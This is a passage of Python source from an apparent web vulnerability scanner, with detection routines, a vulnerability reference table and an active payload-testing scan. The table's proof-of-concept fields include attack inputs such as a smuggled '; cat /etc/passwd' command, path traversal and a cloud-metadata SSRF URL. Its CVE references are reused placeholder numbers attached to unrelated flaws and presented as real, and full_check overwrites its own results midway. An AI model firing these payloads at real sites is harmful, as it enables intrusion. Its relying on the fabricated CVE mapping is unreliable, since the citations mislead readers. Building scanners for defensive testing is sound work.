    def _detect_xpath_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """XPath injection detection."""
        content_lower = content.lower()
        
        xpath_indicators = [
            'xpath syntax error', 'xpath expression',
            'xmldom', 'xml parsing', 'xpath error',
            'msxml', 'libxml'
        ]
        
        for indicator in xpath_indicators:
            if indicator in content_lower:
                return True
        
        return False

    def _detect_open_redirect(self, payload: str, headers: Dict, status: int, final_url: str) -> bool:
        """Open redirect detection."""
        if status in [301, 302, 303, 307, 308]:
            location = headers.get('location', '').lower()
            payload_lower = payload.lower()
            
            # Check if redirect location contains our payload
            if payload_lower in location:
                return True
            
            # Check for external redirects
            if location.startswith(('http://', 'https://', '//')):
                return True
        
        return False

    def _detect_crlf_injection(self, payload: str, headers: Dict) -> bool:
        """CRLF injection detection."""
        # Check if our injected headers appear in response
        if '\r\n' in payload or '%0d%0a' in payload.lower():
            for header_name, header_value in headers.items():
                if 'injected' in header_value.lower():
                    return True
        
        return False

    def _detect_sensitive_file(self, filename: str, content: str, headers: Dict, status: int) -> bool:
        """Enhanced sensitive file detection."""
        if status != 200:
            return False
        
        content_lower = content.lower()
        filename_lower = filename.lower()
        
        # File-specific indicators
        file_indicators = {
            '.env': ['db_password', 'api_key', 'secret', '_key='],
            '.git/config': ['[core]', 'repositoryformatversion', 'remote "origin"'],
            'web.config': ['<configuration>', '<appsettings>', 'connectionstrings'],
            '.htaccess': ['rewriteengine', 'rewriterule', 'options'],
            'composer.json': ['"name":', '"require":', '"autoload":'],
            'package.json': ['"name":', '"version":', '"dependencies":'],
            'robots.txt': ['user-agent:', 'disallow:', 'allow:'],
            'sitemap.xml': ['<urlset', '<url>', '<loc>'],
            'crossdomain.xml': ['<cross-domain-policy>', '<allow-access-from'],
            'id_rsa': ['-----begin', 'private key', '-----end'],
            'backup.sql': ['insert into', 'create table', 'mysqldump']
        }
        
        for file_pattern, indicators in file_indicators.items():
            if file_pattern in filename_lower:
                for indicator in indicators:
                    if indicator in content_lower:
                        return True
        
        # Generic sensitive content patterns
        sensitive_patterns = [
            'password', 'secret', 'private_key', 'api_key',
            'database', 'config', 'admin', 'root',
            'ssh-rsa', 'ssh-dss', 'connection string'
        ]
        
        for pattern in sensitive_patterns:
            if pattern in content_lower and len(content) > 50:
                return True
        
        return False

    def _create_finding(self, type: str, severity: str, details: str, url: str) -> Dict:
        """Enhanced finding creation with comprehensive vulnerability details."""
        
        # Comprehensive OWASP 2025 vulnerability database with detailed categorization
        vuln_database = {
            # 🔓 Authentication & Access Control
            'Broken Access Control': {
                'cve_references': ['CVE-2023-1001', 'CVE-2022-2002'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-284',
                'cvss_score': 8.1,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'IDOR, privilege escalation, forced browsing attacks',
                'remediation': 'Implement proper authorization checks, principle of least privilege',
                'technical_details': 'Access control failures enable unauthorized resource access',
                'poc_example': '/admin/users?id=1 → /admin/users?id=2',
                'affected_components': 'Authorization middleware, API endpoints',
                'business_impact': 'Unauthorized data access, privilege escalation, compliance violations',
                'vulnerability_category': '🔓 Authentication & Access Control'
            },
            'Session Fixation': {
                'cve_references': ['CVE-2023-1234', 'CVE-2022-5678'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-384',
                'cvss_score': 7.3,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Session hijacking, account takeover, unauthorized access',
                'remediation': 'Regenerate session IDs after authentication, secure session management',
                'technical_details': 'Weak session tokens enable session fixation attacks',
                'poc_example': 'Cookie: JSESSIONID=PREDICTABLE_VALUE',
                'affected_components': 'Session management, authentication systems',
                'business_impact': 'Account compromise, unauthorized transactions',
                'vulnerability_category': '🔓 Authentication & Access Control'
            },
            'JWT Token Manipulation': {
                'cve_references': ['CVE-2023-2345', 'CVE-2022-6789'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-347',
                'cvss_score': 8.8,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Algorithm confusion, signature bypass, privilege escalation',
                'remediation': 'Validate JWT algorithms, proper signature verification',
                'technical_details': 'JWT implementation flaws enable token manipulation',
                'poc_example': 'alg: "none", modified claims, signature bypass',
                'affected_components': 'JWT libraries, authentication middleware',
                'business_impact': 'Complete authentication bypass, privilege escalation',
                'vulnerability_category': '🔓 Authentication & Access Control'
            },
            
            # 🧬 Injection & Execution Risks
            'XSS': {
                'cve_references': ['CVE-2023-1234', 'CVE-2022-5678'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-79',
                'cvss_score': 6.1,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Session hijacking, credential theft, malware distribution',
                'remediation': 'Input validation, output encoding, CSP headers',
                'technical_details': 'Cross-Site Scripting enables client-side code execution',
                'poc_example': '<script>alert(document.cookie)</script>',
                'affected_components': 'Web forms, URL parameters, cookies',
                'business_impact': 'Data breach, reputation damage, compliance violations',
                'vulnerability_category': '🕸️ Client-Side & Browser Exploits'
            },
            'SQLi': {
                'cve_references': ['CVE-2023-2345', 'CVE-2022-6789'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-89',
                'cvss_score': 9.8,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Database compromise, data exfiltration, privilege escalation',
                'remediation': 'Use parameterized queries, input validation, least privilege',
                'technical_details': 'SQL injection enables unauthorized database access',
                'poc_example': "' OR 1=1-- ",
                'affected_components': 'Database queries, stored procedures',
                'business_impact': 'Complete data breach, regulatory fines, business disruption',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'Server-Side Template Injection': {
                'cve_references': ['CVE-2023-3456', 'CVE-2022-7890'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-94',
                'cvss_score': 9.6,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Remote code execution, server compromise, data theft',
                'remediation': 'Template sandboxing, input validation, safe template engines',
                'technical_details': 'Template injection enables server-side code execution',
                'poc_example': '{{7*7}}, ${7*7}, #{7*7}',
                'affected_components': 'Template engines, rendering systems',
                'business_impact': 'Complete server compromise, intellectual property theft',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'LDAP Injection': {
                'cve_references': ['CVE-2023-4567', 'CVE-2022-8901'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-90',
                'cvss_score': 7.5,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Directory traversal, data leakage, authentication bypass',
                'remediation': 'Input sanitization, parameterized LDAP queries',
                'technical_details': 'LDAP injection enables directory service abuse',
                'poc_example': '*)(&(objectClass=*',
                'affected_components': 'LDAP queries, directory services',
                'business_impact': 'Corporate directory compromise, credential theft',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'GraphQL Injection': {
                'cve_references': ['CVE-2023-5678', 'CVE-2022-9012'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-89',
                'cvss_score': 8.2,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Malformed queries, introspection abuse, data exposure',
                'remediation': 'Query complexity analysis, rate limiting, disable introspection',
                'technical_details': 'GraphQL vulnerabilities enable API abuse',
                'poc_example': '{__schema{types{name}}}',
                'affected_components': 'GraphQL endpoints, API resolvers',
                'business_impact': 'API abuse, sensitive data exposure',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            
            # 🕸️ Client-Side & Browser Exploits
            'Clickjacking': {
                'cve_references': ['CVE-2023-6789', 'CVE-2022-0123'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-1021',
                'cvss_score': 4.3,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'UI redress attacks, unauthorized actions',
                'remediation': 'X-Frame-Options, CSP frame-ancestors directive',
                'technical_details': 'Missing frame protection enables clickjacking',
                'poc_example': '<iframe src="victim.com">',
                'affected_components': 'Web pages, HTTP headers',
                'business_impact': 'Unauthorized transactions, user deception',
                'vulnerability_category': '🕸️ Client-Side & Browser Exploits'
            },
            'CORS Misconfiguration': {
                'cve_references': ['CVE-2023-7890', 'CVE-2022-1234'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-942',
                'cvss_score': 6.5,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Cross-origin data theft, credential harvesting',
                'remediation': 'Restrict CORS origins, avoid wildcard usage',
                'technical_details': 'Unsafe CORS policies enable cross-origin attacks',
                'poc_example': 'Access-Control-Allow-Origin: *',
                'affected_components': 'API endpoints, web services',
                'business_impact': 'Cross-domain data leakage, API abuse',
                'vulnerability_category': '🕸️ Client-Side & Browser Exploits'
            },
            
            # 📡 Network & Protocol-Level Issues
            'SSRF': {
                'cve_references': ['CVE-2023-5678', 'CVE-2022-9012'],
                'owasp_category': 'A10:2025 – Server-Side Request Forgery',
                'cwe_id': 'CWE-918',
                'cvss_score': 8.6,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Internal network access, cloud metadata access, port scanning',
                'remediation': 'URL validation, network segmentation, allowlist filtering',
                'technical_details': 'Server-Side Request Forgery enables internal network attacks',
                'poc_example': 'http://169.254.169.254/latest/meta-data/',
                'affected_components': 'HTTP clients, URL fetchers, webhooks',
                'business_impact': 'Internal network compromise, cloud credential theft',
                'vulnerability_category': '📡 Network & Protocol-Level Issues'
            },
            'TLS/SSL Misconfiguration': {
                'cve_references': ['CVE-2023-8901', 'CVE-2022-2345'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-326',
                'cvss_score': 7.4,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Man-in-the-middle attacks, data interception',
                'remediation': 'Strong cipher suites, certificate validation, HSTS',
                'technical_details': 'Weak TLS configuration enables encryption bypass',
                'poc_example': 'SSLv3, weak ciphers, expired certificates',
                'affected_components': 'TLS/SSL implementations, web servers',
                'business_impact': 'Data interception, credential theft',
                'vulnerability_category': '📡 Network & Protocol-Level Issues'
            },
            'WebSocket Hijacking': {
                'cve_references': ['CVE-2023-9012', 'CVE-2022-3456'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-346',
                'cvss_score': 6.8,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Unauthenticated socket access, real-time data theft',
                'remediation': 'Origin validation, authentication on WebSocket upgrade',
                'technical_details': 'Missing WebSocket authentication enables hijacking',
                'poc_example': 'ws://victim.com/socket without authentication',
                'affected_components': 'WebSocket endpoints, real-time features',
                'business_impact': 'Real-time data theft, unauthorized access',
                'vulnerability_category': '📡 Network & Protocol-Level Issues'
            },
            
            # 🧱 Infrastructure & Configuration
            'LFI': {
                'cve_references': ['CVE-2023-3456', 'CVE-2022-7890'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-22',
                'cvss_score': 7.5,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'File system access, sensitive data exposure, code execution',
                'remediation': 'Input validation, file path restrictions, sandbox execution',
                'technical_details': 'Local File Inclusion allows reading arbitrary files',
                'poc_example': '../../../etc/passwd',
                'affected_components': 'File upload handlers, include functions',
                'business_impact': 'Confidential data exposure, system compromise',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            'OS Command Injection': {
                'cve_references': ['CVE-2023-4567', 'CVE-2022-8901'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-78',
                'cvss_score': 9.8,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Complete system compromise, data theft, service disruption',
                'remediation': 'Input sanitization, command whitelisting, process isolation',
                'technical_details': 'Command injection allows arbitrary OS command execution',
                'poc_example': '; cat /etc/passwd',
                'affected_components': 'System calls, shell commands, file operations',
                'business_impact': 'Total system compromise, data breach, service outage',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'Insecure Deserialization': {
                'cve_references': ['CVE-2023-0123', 'CVE-2022-4567'],
                'owasp_category': 'A08:2025 – Software and Data Integrity Failures',
                'cwe_id': 'CWE-502',
                'cvss_score': 9.0,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Remote code execution, gadget chains exploitation',
                'remediation': 'Avoid deserialization, integrity checks, sandboxing',
                'technical_details': 'Unsafe deserialization enables RCE via gadget chains',
                'poc_example': 'Serialized payload with malicious objects',
                'affected_components': 'Serialization libraries, object persistence',
                'business_impact': 'Complete application compromise, data theft',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            'Vulnerable Components': {
                'cve_references': ['CVE-2023-1234', 'CVE-2022-5678'],
                'owasp_category': 'A06:2025 – Vulnerable and Outdated Components',
                'cwe_id': 'CWE-1104',
                'cvss_score': 8.2,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Known exploits, dependency vulnerabilities',
                'remediation': 'Regular updates, dependency scanning, version management',
                'technical_details': 'Outdated components contain known vulnerabilities',
                'poc_example': 'CVEs in libraries, frameworks, plugins',
                'affected_components': 'Third-party libraries, frameworks, plugins',
                'business_impact': 'Exploitation via known vulnerabilities',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            
            # 🧠 Logic & Business Layer
            'Business Logic Flaw': {
                'cve_references': ['CVE-2023-2345', 'CVE-2022-6789'],
                'owasp_category': 'A04:2025 – Insecure Design',
                'cwe_id': 'CWE-840',
                'cvss_score': 7.7,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Workflow bypass, payment skipping, unauthorized transactions',
                'remediation': 'Business logic validation, workflow integrity checks',
                'technical_details': 'Application logic flaws enable business process abuse',
                'poc_example': 'Price manipulation, quantity bypass, workflow skipping',
                'affected_components': 'Business workflows, payment systems',
                'business_impact': 'Financial loss, unauthorized transactions',
                'vulnerability_category': '🧠 Logic & Business Layer'
            },
            'Rate Limiting Bypass': {
                'cve_references': ['CVE-2023-3456', 'CVE-2022-7890'],
                'owasp_category': 'A07:2025 – Identification and Authentication Failures',
                'cwe_id': 'CWE-307',
                'cvss_score': 6.5,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Brute force attacks, API abuse, resource exhaustion',
                'remediation': 'Proper rate limiting, CAPTCHA, account lockout',
                'technical_details': 'Missing or bypassable rate limits enable abuse',
                'poc_example': 'X-Forwarded-For header manipulation, distributed requests',
                'affected_components': 'API endpoints, authentication systems',
                'business_impact': 'Service degradation, account compromise',
                'vulnerability_category': '🧠 Logic & Business Layer'
            },
            'API Endpoint Abuse': {
                'cve_references': ['CVE-2023-4567', 'CVE-2022-8901'],
                'owasp_category': 'A09:2025 – Security Logging and Monitoring Failures',
                'cwe_id': 'CWE-285',
                'cvss_score': 7.2,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Over-privileged access, mass assignment, data exposure',
                'remediation': 'API security testing, proper authorization, input validation',
                'technical_details': 'API vulnerabilities enable unauthorized access',
                'poc_example': 'Mass assignment, hidden endpoints, excessive data exposure',
                'affected_components': 'REST APIs, GraphQL endpoints',
                'business_impact': 'Data breach, unauthorized operations',
                'vulnerability_category': '🧠 Logic & Business Layer'
            },
            
            # Security Headers and Configuration
            'Sensitive File Exposure': {
                'cve_references': ['CVE-2023-6789', 'CVE-2022-0123'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-200',
                'cvss_score': 7.5,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Configuration disclosure, credential exposure, source code leak',
                'remediation': 'Proper file permissions, web server configuration, access controls',
                'technical_details': 'Sensitive files accessible via direct URL access',
                'poc_example': '/.env, /.git/config, /backup.sql',
                'affected_components': 'Web server, file system, configuration files',
                'business_impact': 'Credential theft, intellectual property theft',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            'Missing Header': {
                'cve_references': ['CVE-2023-7890', 'CVE-2022-1234'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-16',
                'cvss_score': 4.3,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Clickjacking, MITM attacks, XSS, information disclosure',
                'remediation': 'Implement security headers, HTTPS enforcement, CSP policy',
                'technical_details': 'Missing security headers enable various client-side attacks',
                'poc_example': 'iframe injection, protocol downgrade',
                'affected_components': 'HTTP responses, browser security',
                'business_impact': 'User compromise, data interception, brand damage',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            }
        }
        
        # Get vulnerability details with OWASP 2025 categorization
        vuln_info = vuln_database.get(type, {
            'cve_references': ['N/A'],
            'owasp_category': 'Unknown',
            'cwe_id': 'Unknown',
            'cvss_score': 0.0,
            'exploit_difficulty': 'Unknown',
            'attack_vector': 'Unknown',
            'impact': 'Unknown impact',
            'remediation': 'Consult security documentation',
            'technical_details': 'No additional details available',
            'poc_example': 'N/A',
            'affected_components': 'Unknown',
            'business_impact': 'Unknown business impact',
            'vulnerability_category': '🔍 Uncategorized'
        })
        
        return {
            'type': type,
            'severity': severity,
            'details': details,
            'url': str(url),
            'timestamp': datetime.now().isoformat(),
            # Enhanced vulnerability information with OWASP 2025 framework
            'cve_references': vuln_info['cve_references'],
            'owasp_category': vuln_info['owasp_category'],
            'cwe_id': vuln_info['cwe_id'],
            'cvss_score': vuln_info['cvss_score'],
            'exploit_difficulty': vuln_info['exploit_difficulty'],
            'attack_vector': vuln_info['attack_vector'],
            'impact_description': vuln_info['impact'],
            'remediation_steps': vuln_info['remediation'],
            'technical_details': vuln_info['technical_details'],
            'poc_example': vuln_info['poc_example'],
            'affected_components': vuln_info['affected_components'],
            'business_impact': vuln_info['business_impact'],
            'vulnerability_category': vuln_info['vulnerability_category'],
            'risk_score': self._calculate_risk_score(severity, vuln_info['cvss_score']),
            'compliance_impact': self._get_compliance_impact(type),
            'exploitability': self._assess_exploitability(vuln_info['exploit_difficulty']),
            'discovery_method': self._get_discovery_method(details)
        }

    def _calculate_risk_score(self, severity: str, cvss_score: float) -> int:
        """Calculate comprehensive risk score."""
        severity_multiplier = {'LOW': 1, 'MEDIUM': 2, 'HIGH': 3, 'CRITICAL': 4}
        base_score = severity_multiplier.get(severity, 1) * 25
        cvss_adjustment = int(cvss_score * 10)
        return min(100, base_score + cvss_adjustment)

    def _get_compliance_impact(self, vuln_type: str) -> str:
        """Assess compliance framework impact."""
        compliance_map = {
            'XSS': 'PCI DSS 6.5.7, OWASP Top 10, ISO 27001',
            'SQLi': 'PCI DSS 6.5.1, SOX, HIPAA, GDPR Article 32',
            'LFI': 'PCI DSS 6.5.4, ISO 27001 A.14.2.5',
            'OS Command Injection': 'PCI DSS 6.5.1, NIST 800-53 SI-10',
            'SSRF': 'OWASP Top 10, NIST Cybersecurity Framework',
            'Sensitive File Exposure': 'PCI DSS 3.4, GDPR Article 32, HIPAA',
            'Missing Header': 'OWASP ASVS, NIST 800-53 SC-28'
        }
        return compliance_map.get(vuln_type, 'General security best practices')

    def _assess_exploitability(self, difficulty: str) -> Dict:
        """Assess exploitability characteristics."""
        exploitability_map = {
            'Easy': {'automated_tools': 'Yes', 'skill_required': 'Low', 'time_to_exploit': '<1 hour'},
            'Medium': {'automated_tools': 'Partial', 'skill_required': 'Medium', 'time_to_exploit': '1-4 hours'},
            'Hard': {'automated_tools': 'No', 'skill_required': 'High', 'time_to_exploit': '>4 hours'}
        }
        return exploitability_map.get(difficulty, {'automated_tools': 'Unknown', 'skill_required': 'Unknown', 'time_to_exploit': 'Unknown'})

    def _get_discovery_method(self, details: str) -> str:
        """Determine how vulnerability was discovered."""
        if 'payload' in details.lower():
            return 'Active payload testing'
        elif 'header' in details.lower():
            return 'HTTP header analysis'
        elif 'file' in details.lower():
            return 'File enumeration'
        else:
            return 'Automated security scan'

    async def full_check(self, url: str, progress, task_id) -> Dict:
        """Enhanced security checks with advanced reconnaissance and vulnerability scanning."""
        all_findings = []
        site_info = await self.get_site_info(url)
        
        # Phase 1: Advanced Reconnaissance (10% progress)
        progress.update(task_id, advance=10, description=f"[cyan]Advanced reconnaissance for {url[:50]}...")
        reconnaissance_findings = await self._comprehensive_vulnerability_scan(url)
        all_findings.extend(reconnaissance_findings)
        
        # Smart payload prioritization - test high-impact vulnerabilities first
        priority_tasks = []
        
        # Priority 1: Critical vulnerabilities with most effective payloads
        high_priority = ['sqli', 'lfi', 'cmd_injection', 'sensitive_files']
        for check_type in high_priority:
            if check_type in self.payloads:
                # Use only top 3 most effective payloads for speed
                effective_payloads = self.payloads[check_type][:3]
                for payload in effective_payloads:
                    priority_tasks.append(self.check_vulnerability(url, check_type, payload))
        
        # Priority 2: Medium impact vulnerabilities  
        medium_priority = ['xss', 'ssrf', 'open_redirect']
        for check_type in medium_priority:
            if check_type in self.payloads:
                effective_payloads = self.payloads[check_type][:2]  # Top 2 payloads
                for payload in effective_payloads:
                    priority_tasks.append(self.check_vulnerability(url, check_type, payload))
        
        # Priority 3: Specialized injection types (1 payload each for speed)
        specialized = ['nosql_injection', 'ldap_injection', 'xpath_injection', 'crlf_injection', 'template_injection', 'xxe']
        for check_type in specialized:
            if check_type in self.payloads:
                # Only use the most effective payload
                priority_tasks.append(self.check_vulnerability(url, check_type, self.payloads[check_type][0]))
        
        # Add header check
        priority_tasks.append(self.check_headers(url))

        # Execute with high concurrency and batch processing (90% progress)
        batch_size = 25  # Optimal batch size for progress updates
        total_tasks = len(priority_tasks)
        remaining_progress = 90  # 90% remaining for vulnerability scanning
        
        for i in range(0, total_tasks, batch_size):
            batch = priority_tasks[i:i + batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    all_findings.extend(result)
                elif isinstance(result, Exception):
                    self.config.logger.debug(f"Task failed: {result}")
            
            # Frequent progress updates for better UX
            progress_amount = min(batch_size, total_tasks - i) * (remaining_progress / total_tasks)
            progress.update(task_id, advance=progress_amount)

        progress.update(task_id, completed=100)
        
        # Phase 3: Comprehensive Discovery Analysis (after main scanning)
        self.config.logger.info("Starting comprehensive discovery analysis...")
        
        # Enhanced scan results with advanced intelligence
        enhanced_site_info = site_info.copy()
        
        # Advanced webpage discovery
        webpage_discovery = await self._advanced_webpage_discovery(url)
        enhanced_site_info['webpage_discovery'] = webpage_discovery
        
        # File leak detection
        file_leak_analysis = await self._advanced_file_leak_detection(url)
        enhanced_site_info['file_leak_analysis'] = file_leak_analysis
        
        # Parameter enumeration
        parameter_enumeration = await self._advanced_parameter_enumeration(url)
        enhanced_site_info['parameter_enumeration'] = parameter_enumeration
        
        # Website structure mapping and per-URL vulnerability analysis
        self.config.logger.info("Starting website structure mapping...")
        website_structure = await self._website_structure_mapping(url)
        enhanced_site_info['website_structure'] = website_structure
        
        # Add advanced reconnaissance data if available
        enhanced_site_info = site_info.copy()
        
        # Add advanced reconnaissance data if available
        if SHODAN_AVAILABLE:
            enhanced_site_info['shodan_intelligence'] = await self._advanced_shodan_reconnaissance(url)
        if WHOIS_AVAILABLE:
            enhanced_site_info['whois_analysis'] = await self._advanced_whois_analysis(url)
        if BUILTWITH_AVAILABLE:
            enhanced_site_info['technology_analysis'] = await self._advanced_technology_detection(url)
        if WAYBACK_AVAILABLE:
            enhanced_site_info['historical_analysis'] = await self._wayback_machine_analysis(url)
        if DNS_AVAILABLE:
            enhanced_site_info['dns_intelligence'] = await self._advanced_dns_reconnaissance(url)
        if SSLYZE_AVAILABLE:
            enhanced_site_info['ssl_analysis'] = await self._advanced_ssl_analysis(url)
        if HTTPX_AVAILABLE:
            enhanced_site_info['http_analysis'] = await self._advanced_http_analysis(url)
        if SCAPY_AVAILABLE:
            enhanced_site_info['network_analysis'] = await self._network_packet_analysis(url)
        
        # Re-add discovery data to ensure it's included
        enhanced_site_info['webpage_discovery'] = webpage_discovery
        enhanced_site_info['file_leak_analysis'] = file_leak_analysis
        enhanced_site_info['parameter_enumeration'] = parameter_enumeration
        
        return {
            'url': url, 
            'findings': all_findings, 
            'site_info': enhanced_site_info,
            'total_checks': total_tasks + len(reconnaissance_findings),
            'advanced_reconnaissance': True,
            'comprehensive_discovery': True,
            'discovery_metrics': {
                'total_pages': webpage_discovery.get('total_pages', 0),
                'total_file_leaks': file_leak_analysis.get('total_leaks', 0),
                'total_parameters': parameter_enumeration.get('total_parameters', 0),
                'admin_panels': len(webpage_discovery.get('admin_panels', [])),
                'api_endpoints': len(webpage_discovery.get('api_endpoints', [])),
                'sensitive_files': len(file_leak_analysis.get('sensitive_files', [])),
                'injectable_parameters': len(parameter_enumeration.get('injectable_parameters', []))
            },
            'intelligence_sources': {
                'shodan': SHODAN_AVAILABLE,
                'whois': WHOIS_AVAILABLE,
                'builtwith': BUILTWITH_AVAILABLE,
                'wayback': WAYBACK_AVAILABLE,
                'dns': DNS_AVAILABLE,
                'sslyze': SSLYZE_AVAILABLE,
                'httpx': HTTPX_AVAILABLE,
                'scapy': SCAPY_AVAILABLE,
                'advanced_discovery': True
            }
        }

    async def check_headers(self, url: str) -> List[Dict]:
        """Check for missing security headers."""
        findings = []
        try:
            status, headers, content, final_url = await self.session.get(url)
            if not headers: return []
            
            headers = {k.lower(): v for k, v in headers.items()}
            security_headers = {'content-security-policy': 'HIGH', 'x-frame-options': 'MEDIUM', 'strict-transport-security': 'HIGH', 'x-content-type-options': 'LOW'}
            for header, severity in security_headers.items():
                if header not in headers:
                    findings.append(self._create_finding('Missing Header', severity, f"Missing {header}", url))
        except Exception as e:
            self.config.logger.debug(f"Header check failed for {url}: {e}")
        return findings

    # === Technical Reconnaissance Helper Methods ===
    
    async def _analyze_server_hosting(self, url: str, headers: Dict, content: str) -> Dict:
        """🖥️ Server & Hosting Information Analysis"""
        server_info = {}
        
        try:
            # 1. Server Software & Version
            server_header = headers.get('Server', 'Unknown')
            server_info['server_software'] = server_header
            
            # 2. IP Address & Geolocation
            domain = urlparse(url).netloc
            try:
                ip_address = socket.gethostbyname(domain)
                server_info['ip_address'] = ip_address
            except socket.gaierror:
                server_info['ip_address'] = 'Resolution failed'
            
            # 3. HTTP Response Headers Analysis
            server_info['response_headers'] = dict(headers)
            
            # 4. SSL/TLS Certificate Information
            if url.startswith('https://'):
                server_info['ssl_enabled'] = True
                server_info['security_headers'] = {
                    'HSTS': 'Strict-Transport-Security' in headers,
                    'CSP': 'Content-Security-Policy' in headers,
                    'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
                    'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing')
                }
            
            # 5. Cloud Provider Detection
            server_info['cloud_provider'] = self._detect_cloud_provider(headers, content)
            
            # 6. CDN Detection
            server_info['cdn_detected'] = self._detect_cdn(headers)
            
            # 7. Load Balancer Detection
            server_info['load_balancer'] = self._detect_load_balancer(headers)
            
            # 8. Web Application Firewall
            server_info['waf_detected'] = self._detect_waf(headers, content)
            
            # 9. Server Response Time
            server_info['response_time'] = headers.get('X-Response-Time', 'Not provided')
            
            # 10. Hosting Environment Details
            server_info['hosting_environment'] = self._analyze_hosting_environment(headers, content)
            
        except Exception as e:
            self.config.logger.debug(f"Server hosting analysis error: {e}")
        
        return server_info

    async def _analyze_backend_stack(self, headers: Dict, content: str, url: str) -> Dict:
        """🧱 Backend Stack Detection & Analysis"""
        backend_info = {}
        
        try:
            # 1. Programming Language Detection
            backend_info['programming_language'] = self._detect_programming_language(headers, content)
            
            # 2. Web Framework Identification
            backend_info['web_framework'] = self._detect_web_framework(headers, content)
            
            # 3. Database Technology
            backend_info['database_hints'] = self._detect_database_technology(content, headers)
            
            # 4. Application Server
            backend_info['application_server'] = self._detect_application_server(headers)
            
            # 5. API Technology & Endpoints
            backend_info['api_technology'] = self._detect_api_technology(content, headers)
            
            # 6. Session Management
            backend_info['session_management'] = self._analyze_session_management(headers)
            
            # 7. Authentication System
            backend_info['auth_system'] = self._detect_authentication_system(headers, content)
            
            # 8. Caching Strategy
            backend_info['caching_strategy'] = self._analyze_caching_strategy(headers)
            
            # 9. Backend Security Measures
            backend_info['security_measures'] = self._analyze_backend_security(headers, content)
            
            # 10. Microservices Architecture
            backend_info['microservices_indicators'] = self._detect_microservices(headers, content)
            
        except Exception as e:
            self.config.logger.debug(f"Backend stack analysis error: {e}")
        
        return backend_info

    async def _analyze_frontend_stack(self, content: str, headers: Dict) -> Dict:
        """🎨 Frontend Stack Analysis"""
        frontend_info = {}
        
        try:
            # 1. JavaScript Frameworks/Libraries
            frontend_info['js_frameworks'] = self._detect_js_frameworks(content)
            
            # 2. CSS Frameworks & Preprocessors
            frontend_info['css_frameworks'] = self._detect_css_frameworks(content)
            
            # 3. Frontend Build Tools
            frontend_info['build_tools'] = self._detect_build_tools(content)
            
            # 4. Package Managers
            frontend_info['package_managers'] = self._detect_package_managers(content)
            
            # 5. UI Component Libraries
            frontend_info['ui_libraries'] = self._detect_ui_libraries(content)
            
            # 6. Frontend Security Features
            frontend_info['frontend_security'] = self._analyze_frontend_security(content, headers)
            
            # 7. Progressive Web App Features
            frontend_info['pwa_features'] = self._detect_pwa_features(content, headers)
            
            # 8. Single Page Application
            frontend_info['spa_indicators'] = self._detect_spa_indicators(content)
            
            # 9. Frontend Performance Optimizations
            frontend_info['performance_optimizations'] = self._analyze_frontend_performance(content, headers)
            
            # 10. Third-party Integrations
            frontend_info['third_party_integrations'] = self._detect_third_party_integrations(content)
            
        except Exception as e:
            self.config.logger.debug(f"Frontend stack analysis error: {e}")
        
